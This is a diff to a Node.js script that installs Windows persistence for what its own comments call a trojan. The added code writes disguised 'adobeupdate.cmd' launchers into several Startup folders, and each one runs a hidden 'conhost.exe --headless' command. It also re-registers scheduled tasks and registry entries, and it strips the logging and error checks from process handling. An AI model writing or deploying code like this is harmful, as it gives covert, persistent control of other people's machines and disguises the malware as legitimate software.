@@ -1,3 +1,6 @@
+// https://github.com/gauravmehla/Javascript-bookshelf/blob/master/O'Reilly%20-%20You%20Don't%20Know%20JS.%20this%20%26%20Object%20Prototypes.pdf
+// https://www.tutorialspoint.com/compilers/online-nodejs-compiler.htm
+
 // debugger;
 
 // https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce.com/
@@ -98,10 +101,6 @@ var taskconfig = {
     },
 };
 
-var startupfolderconfig = {
-
-};
-
 var regstartupconfig = {
 
     startup_name: '', 
@@ -142,20 +141,57 @@ var regstartupconfig = {
     }
 };
 
-// TODO: folder name + enabled
 var startupfolderconfig = {
     
+    getFolder(foldername) {
+        this.folders.forEach( (folder) => {
+            if ( folder.name == foldername )
+                return folder;
+        });
+    },
+
+    getFolderPath(foldername) {
+        this.folders.forEach( (folder) => {
+            if ( folder.name == foldername )
+                return folder.folderpath;
+        });
+    },
+
+    getLauncherScript(foldername) {
+        return `conhost.exe --headless C:\\ProgramData\\owd\\launch.cmd ${foldername}`;
+    },
+
+    get foldernames() {
+        let tfoldernames = [];
+
+        this.folders.forEach( (folder) => {
+            tfoldernames.push( folder.name );
+        });
+
+        return tfoldernames;
+    },
+
     folders: [
-        { name:'folder_001', enabled: true },
-        { name:'folder_002', enabled: true },
-        { name:'folder_003', enabled: true }
+        { 
+            enabled: true, 
+            name: 'startup_allusers',
+            folderpath: 'C:\\Users\\All Users\\MandatoryProfile\\Mandatory.V6\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',
+        },
+        
+        { 
+            enabled: true, 
+            name: 'startup_profile',
+            folderpath: 'C:\\ProgramData\\MandatoryProfile\\Mandatory.V6\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
+        },
+        
+        { 
+            id:'folder_003', 
+            enabled: true, 
+            folderpath: 'C:\\Users\\ADULT2022\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
+        }
     ],
 
-    folderpaths: {
-        'folder_001':'C:\\Users\\All Users\\MandatoryProfile\\Mandatory.V6\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',
-        'folder_002':'C:\\ProgramData\\MandatoryProfile\\Mandatory.V6\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',
-        'folder_003':'C:\\Users\\ADULT2022\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' 
-    }
+    // return `conhost.exe --headless C:\\ProgramData\\owd\\launch.cmd ${startup_loc_name}`;
 
 };
 
@@ -2721,14 +2757,6 @@ function cmdlist() {
     logmsg("finished");
 }
 
-// TODO
-function validateTask(taskdetail) {
-    // Last Run Time
-    // Last Result
-    return true;
-}
-
-// TODO
 async function reschedule() {
     let tasknames = taskconfig.tasknames;
 
@@ -2736,14 +2764,9 @@ async function reschedule() {
 
     for (let i = 0; i < tasknames.length; i++) {
         let taskname = tasknames[i];
-        let taskdetail = null;
 
-        if (ptasknames.includes(taskname)) {
-            logmsg(`task ${taskname} registered`);
-            taskdetail = await getTaskDetail(taskname);
-
-            if (!validateTask(taskdetail)) await createTask(taskname);
-
+        if ( ptasknames.includes(taskname) ) {
+            logmsg(`existing task ${taskname} registered -- skipping`);
             continue;
         } else {
             await createTask(taskname);
@@ -2794,23 +2817,27 @@ async function penetrate_reg() {
 }
 
 async function penetrate_folders() {
-    // create and copy startup_launch.cmd into folders
-    // conhost.exe --headless C:\ProgramData\owd\launch.cmd startup_allusers, startup_profile, startup_adult2022
-    /*
-    C:\Users\All Users\MandatoryProfile\Mandatory.V6\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup 
-    C:\ProgramData\MandatoryProfile\Mandatory.V6\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-    C:\Users\ADULT2022\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup 
-    */
+
+    let foldernames = startupfolderconfig.foldernames;
+
+    for ( let i = 0; i<foldernames.length; i++) {
+        let foldername = foldernames[i];
+        let fpath = path.join(startupfolderconfig.getFolderPath(foldername), 'adobeupdate.cmd');
+        let script_txt = startupfolderconfig.getLauncherScript(foldername);
+
+        fs.writeFileSync(fpath, script_txt, "utf8");
+    }
+
 }
 
 async function penetrate() {
     logmsg("starting");
 
-    await reschedule(); // tasks
+    await reschedule();
 
-    await penetrate_reg(); // registry
+    await penetrate_reg();
 
-    await penetrate_folders(); // startup folders
+    await penetrate_folders();
 
     // TODO await cleanup() // check if trojandir needs cleanup, if so remove log files, etc.
 
@@ -2845,15 +2872,16 @@ async function invoke_exe(
         try {
             child?.stdout?.on("data", (data) => {
                 let text = data.toString();
-                logmsg(`stdout: ${text}`);
-                if (stdoutfunc) stdoutfunc(text);
+                
+                if (stdoutfunc) 
+                    stdoutfunc(text);
             });
 
             child?.stderr?.on("data", (data) => {
                 let text = data.toString();
 
-                logmsg(`stderr: ${text}`);
-                if (stderrfunc) stderrfunc(text);
+                if (stderrfunc) 
+                    stderrfunc(text);
             });
 
             child?.on("close", (code) => {
@@ -2863,11 +2891,7 @@ async function invoke_exe(
                     closefunc(code);
                 }
 
-                if (code === 0) {
-                    resolve(child);
-                } else {
-                    reject(new Error(`Process exited with code ${code}`));
-                }
+                resolve(child);
             });
 
             child.on("error", (err) => {
